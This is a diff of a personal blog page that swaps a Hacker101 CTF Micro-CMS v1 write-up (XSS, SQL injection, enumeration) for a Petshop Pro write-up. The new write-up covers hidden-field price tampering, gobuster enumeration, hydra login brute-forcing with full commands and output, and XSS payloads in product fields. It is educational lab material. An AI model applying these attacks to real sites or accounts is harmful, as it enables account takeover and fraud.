@@ -1,17 +1,17 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='A great place to start off Hacker101 CTF challanges. Explore and learn about XSS and SQLI.'><title>Hacker101 CTF: Micro-CMS v1 Writeup</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Learn about getting stuff for cheap, enumeration, brute-forcing and XSS. Includes cute kitten pictures.'><title>Hacker101 CTF: Petshop Pro Writeup</title>
 
-<link rel='canonical' href='https://chaudhary1337.github.io/p/hacker101-ctf-micro-cms-v1-writeup/'>
+<link rel='canonical' href='https://chaudhary1337.github.io/p/hacker101-ctf-petshop-pro-writeup/'>
 
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Hacker101 CTF: Micro-CMS v1 Writeup'>
-<meta property='og:description' content='A great place to start off Hacker101 CTF challanges. Explore and learn about XSS and SQLI.'>
-<meta property='og:url' content='https://chaudhary1337.github.io/p/hacker101-ctf-micro-cms-v1-writeup/'>
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Hacker101 CTF: Petshop Pro Writeup'>
+<meta property='og:description' content='Learn about getting stuff for cheap, enumeration, brute-forcing and XSS. Includes cute kitten pictures.'>
+<meta property='og:url' content='https://chaudhary1337.github.io/p/hacker101-ctf-petshop-pro-writeup/'>
 <meta property='og:site_name' content='Tanishq Chaudhary'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='xss' /><meta property='article:tag' content='sql-injection' /><meta property='article:published_time' content='2021-07-13T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-07-13T00:00:00&#43;00:00'/>
-<meta name="twitter:title" content="Hacker101 CTF: Micro-CMS v1 Writeup">
-<meta name="twitter:description" content="A great place to start off Hacker101 CTF challanges. Explore and learn about XSS and SQLI.">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='web' /><meta property='article:tag' content='brute-forcing' /><meta property='article:tag' content='xss' /><meta property='article:published_time' content='2021-07-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-07-19T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="Hacker101 CTF: Petshop Pro Writeup">
+<meta name="twitter:description" content="Learn about getting stuff for cheap, enumeration, brute-forcing and XSS. Includes cute kitten pictures.">
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
@@ -303,12 +303,12 @@ m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
     
 
     <h2 class="article-title">
-        <a href="/p/hacker101-ctf-micro-cms-v1-writeup/">Hacker101 CTF: Micro-CMS v1 Writeup</a>
+        <a href="/p/hacker101-ctf-petshop-pro-writeup/">Hacker101 CTF: Petshop Pro Writeup</a>
     </h2>
 
     
     <h3 class="article-subtitle">
-        A great place to start off Hacker101 CTF challanges. Explore and learn about XSS and SQLI.
+        Learn about getting stuff for cheap, enumeration, brute-forcing and XSS. Includes cute kitten pictures.
     </h3>
     <footer class="article-time">
         <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
@@ -319,38 +319,93 @@ m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
 
 
 
-        <time class="article-time--published">Jul 13, 2021</time>
+        <time class="article-time--published">Jul 19, 2021</time>
     </footer></div>
 </header>
 
     <section class="article-content">
-    <h1 id="hacker101-ctf-micro-cms-v1-writeup">Hacker101 CTF: Micro-CMS v1 Writeup</h1>
-<h2 id="1-exploration">1. Exploration</h2>
-<p>Landing page shows two files. Looks like we are going to deal with markdown.
-<img src="https://i.imgur.com/Qmb0Nz9.png" alt="landing page where we see the list of pages"  /></p>
-<p>Creating new page allows us to put in title and some content.
-<img src="https://i.imgur.com/SIT2g6R.png" alt="page that creates markdown pages"  /></p>
-<p>Fact: markdown supports html. This means we can try all sorts of XSS attacks.
-<img src="https://i.imgur.com/GJStdhR.png" alt="testing out markdown stuff"  />
-Script tag doesn&rsquo;t work.</p>
-<h2 id="2-enumeration">2. Enumeration</h2>
+    <h1 id="hacker101-ctf-petshop-pro-writeup">Hacker101 CTF: Petshop Pro Writeup</h1>
+<h2 id="flag-0---snooping-around">Flag 0 - Snooping Around</h2>
+<p>Home page:
+<img src="https://i.imgur.com/9KpnA8q.png" alt="home page of petshop pro"  /></p>
+<p>Add to cart takes us to <code>/add/0</code> or <code>/add/1</code> for kitten/puppy respectively.
+<code>/cart</code> is another path. Source code for <code>/checkout</code> isn&rsquo;t anything special:
+<img src="https://i.imgur.com/ia1mbWp.png" alt="checkout page showing list of items in the cart."  /></p>
+<p>In the source code of <code>/cart</code> I found:</p>
+<pre><code>		&lt;form action=&quot;checkout&quot; method=&quot;POST&quot;&gt;
+			&lt;input type=&quot;hidden&quot; name=&quot;cart&quot; value=&quot;[[1, {&amp;#34;logo&amp;#34;: &amp;#34;puppy.jpg&amp;#34;, &amp;#34;price&amp;#34;: 7.95, &amp;#34;name&amp;#34;: &amp;#34;Puppy&amp;#34;, &amp;#34;desc&amp;#34;: &amp;#34;8\&amp;#34;x10\&amp;#34; color glossy photograph of a puppy.&amp;#34;}], [0, {&amp;#34;logo&amp;#34;: &amp;#34;kitten.jpg&amp;#34;, &amp;#34;price&amp;#34;: 8.95, &amp;#34;name&amp;#34;: &amp;#34;Kitten&amp;#34;, &amp;#34;desc&amp;#34;: &amp;#34;8\&amp;#34;x10\&amp;#34; color glossy photograph of a kitten.&amp;#34;}]]&quot;&gt;
+			&lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;Check Out&quot;&gt;&lt;/p&gt;
+		&lt;/form&gt;
+</code></pre><p>Using a beautifier online, we get:
+<code>&quot;[[1, {&quot;logo&quot;: &quot;puppy.jpg&quot;, &quot;price&quot;: 7.95, &quot;name&quot;: &quot;Puppy&quot;, &quot;desc&quot;: &quot;8&quot;x10&quot; color glossy photograph of a puppy.&quot;}], [0, {&quot;logo&quot;: &quot;kitten.jpg&quot;, &quot;price&quot;: 8.95, &quot;name&quot;: &quot;Kitten&quot;, &quot;desc&quot;: &quot;8&quot;x10&quot; color glossy photograph of a kitten.&quot;}]]&quot;</code></p>
+<p>Looks like we can specify the price here. *its free real estate*. Changing the price to 0, or reducing it gives as such:
+<img src="https://i.imgur.com/hzVUJkV.png" alt="changing the price to 0"  /></p>
+<p>I first URL decoded, then changed its value and then encoded it again.</p>
+<p><img src="https://i.imgur.com/jxqetAx.png" alt="first flag found"  /></p>
+<h2 id="flag1---enumeration--brute-forcing">Flag1 - Enumeration &amp; Brute-forcing</h2>
+<p>Doing some enumeration:</p>
 <pre><code>┌──(kali㉿kali)-[~]
-└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 32 -q -u http://35.190.155.168/46a90aa06a/page/
-/10                   (Status: 200) [Size: 309]
-/11                   (Status: 200) [Size: 213]
-/1                    (Status: 200) [Size: 239]
-/01                   (Status: 200) [Size: 239]
-/2                    (Status: 200) [Size: 433]
-/07                   (Status: 403) [Size: 234]
-</code></pre><p>10 &amp; 11 are pages I created for funsies, and 1 &amp; 2 were there already. 7 looks off.</p>
-<p>The page itself is forbidden, as it shows status 403. We observe: <code>/page/edit/1</code> is the path for editing the page. This means we can try editing the page 7.
-<img src="https://i.imgur.com/IcWUB3E.png" alt="editing the page 7"  />
-and we get a flag!</p>
-<h2 id="3-xss">3. XSS</h2>
-<p>I was playing around with XSS and I realised that the image tag should work - because one sample page had it. Trying out <code>&lt;image src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/image&gt;</code> works!</p>
-<p>Check the source code again for the flag. Try the same in the title, and get another flag!</p>
-<h2 id="4-sqli">4. SQLI</h2>
-<p>The attack - <code>/page/1'</code> does not work. <code>/page/edit/1'</code> works! We thus get the final flag.</p>
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 108 -q -u http://MACHINE_IP/some_hex_was_here/
+/login                (Status: 200) [Size: 329]
+/static               (Status: 301) [Size: 186] [--&gt; http://127.0.0.1/static/]
+/cart                 (Status: 200) [Size: 410]                               
+/edit                 (Status: 400) [Size: 192]                               
+/checkout             (Status: 405) [Size: 178]
+</code></pre><p>The login page.
+<img src="https://i.imgur.com/8lRDyRm.png" alt="login page for admins"  /></p>
+<p>Maybe SQLI? Tried using sqlmap, didn&rsquo;t work.</p>
+<pre><code>POST /some_hex_was_here/login HTTP/1.1
+
+...
+
+username=admin&amp;password=admin
+</code></pre><p>Let&rsquo;s use hydra to bruteforce. First let&rsquo;s get the username right. Once we have that, we can go for password. I say this becuase of the error mesasge we see was telling us &ldquo;Invalid username&rdquo;.</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ hydra -L /usr/share/wordlists/rockyou.txt -p &quot;doesntmatter&quot; MACHINE_IP http-post-form &quot;/some_hex_was_here/login:username=^USER^&amp;password=^PASS^:Invalid username&quot; -t 32
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-19 05:55:40
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344399 login tries (l:14344399/p:1), ~448263 tries per task
+[DATA] attacking http-post-form://MACHINE_IP:80/some_hex_was_here/login:username=^USER^&amp;password=^PASS^:Invalid username
+[STATUS] 1234.00 tries/min, 1234 tries in 00:01h, 14343165 to do in 193:44h, 32 active
+[STATUS] 1227.33 tries/min, 3682 tries in 00:03h, 14340717 to do in 194:45h, 32 active
+[STATUS] 1234.29 tries/min, 8640 tries in 00:07h, 14335759 to do in 193:35h, 32 active
+[80][http-post-form] host: MACHINE_IP   login: augusta   password: doesntmatter
+</code></pre><p>Great! Username is <code>augusta</code>. Now for the password and its error message. Trying it out says &ldquo;Invalid password&rdquo;. Onto brute-forcing again!</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ hydra -l augusta -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form &quot;/some_hex_was_here/login:username=^USER^&amp;password=^PASS^:Invalid password&quot; -t 32
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-19 06:22:00
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344399 login tries (l:1/p:14344399), ~448263 tries per task
+[DATA] attacking http-post-form://MACHINE_IP:80/some_hex_was_here/login:username=^USER^&amp;password=^PASS^:Invalid password
+[STATUS] 1187.00 tries/min, 1187 tries in 00:01h, 14343212 to do in 201:24h, 32 active
+[80][http-post-form] host: MACHINE_IP   login: augusta   password: eileen
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-19 06:24:17
+</code></pre><p>Nice. On the homepage is the flag! If the syntax confuses you, here&rsquo;s a quick summary:</p>
+<ul>
+<li>-l flag to specify a username, -L for a list of usernames</li>
+<li>similarly for -p and -P</li>
+<li>http-post-form tells that there is a form being posted</li>
+<li>the format is &ldquo;path:user or pass combi:invalid error message&rdquo;, colons spearate</li>
+<li>-t is the number of threads</li>
+</ul>
+<h2 id="flag2---xss">Flag2 - XSS</h2>
+<p>I tried editing the price and the details, and it looks like all the details get updated, even for the items in the cart. That sounds nice.</p>
+<p>After a lot of searching around and hunting, I got to: XSS. Yes, XSS in the name and descriptions!</p>
+<p>I used: <code>&lt;image src/onerror=prompt(8)&gt;</code> to attack.</p>
+<p><img src="https://i.imgur.com/gC0u0aL.jpg" alt="editing name and descriptions for the kitten image product"  /></p>
+<p>The shopping cart then shows the flag!
+<img src="https://i.imgur.com/IV8NPRx.png" alt="showing the flag in the shopping cart"  /></p>
+<h2 id="lessons-learnt">Lessons Learnt</h2>
+<ul>
+<li>always get the products for cheaper if you can</li>
+<li>SQLI is cool, but bruteforcing saves the day</li>
+<li>XSS is everywhere YEE</li>
+</ul>
 
 </section>
 
@@ -359,9 +414,11 @@ and we get a flag!</p>
     
     <section class="article-tags">
         
-            <a href="/tags/xss/">xss</a>
+            <a href="/tags/web/">web</a>
         
-            <a href="/tags/sql-injection/">sql-injection</a>
+            <a href="/tags/brute-forcing/">brute-forcing</a>
+        
+            <a href="/tags/xss/">xss</a>
         
     </section>
 
@@ -403,12 +460,12 @@ and we get a flag!</p>
                 
                     
 <article class="">
-    <a href="/p/hacker101-ctf-petshop-pro-writeup/">
+    <a href="/p/hacker101-ctf-micro-cms-v1-writeup/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">Hacker101 CTF: Petshop Pro Writeup</h2>
+            <h2 class="article-title">Hacker101 CTF: Micro-CMS v1 Writeup</h2>
         </div>
     </a>
 </article>
